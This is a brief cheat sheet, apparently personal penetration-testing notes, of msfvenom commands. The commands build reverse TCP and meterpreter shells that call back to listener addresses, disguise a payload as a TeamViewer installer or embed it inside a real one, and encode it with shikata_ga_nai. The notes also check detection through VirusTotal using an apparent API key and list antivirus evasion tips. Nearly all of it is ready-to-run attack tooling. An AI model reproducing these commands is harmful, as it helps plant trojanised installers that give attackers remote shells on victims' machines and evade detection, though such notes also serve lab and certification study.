#MSFVenom #shells #payloads #encoding

- Tool to create and encode payloads
##### REMEMBER TO MATCH MSFCONSOLE HANDLER TO MSFVENOM PAYLOAD

[msfhandler]

Commands
- `msfvenom -a x86 --platform windows -p windows/shell/reverse_tcp LHOST=127.0.0.1 LPORT=4444 -b "\x00" -f perl -e x86/shikata_ga_nai` create a reverse TCP shell in a perl binary encoded with shikata_ga_nai
- `msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=8080 -e x86/shikata_ga_nai -f exe -i 10 -o /root/Desktop/TeamViewerInstall.exe` create a reverse TCP shell in a PE binary encoded with 10 iterations of shikata_ga_nai
- `msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=1337 -f aspx > reverse_shell.aspx` create a meterpreter payload that runs on c# servers (MS IIS)
- `msf-virustotal -k b10b8af5e068dc8ba9d48946b85aa7d499d45fa8114abc93aed2fd24fe2c721d -f TeamViewerInstall.exe` check if virus total can detect your payload
- `msfvenom windows/x86/meterpreter_reverse_tcp LHOST=10.10.14.2 LPORT=8080 -k -x ~/Downloads/TeamViewer_Setup.exe -e x86/shikata_ga_nai -a x86 --platform windows -o ~/Desktop/TeamViewer_Setup.exe -i 5` embed a meterpreter payload inside an installer and encode it with shikata

Evasion Tips
- store within multiple layers of compression/archival formats
- password protection of file
- packers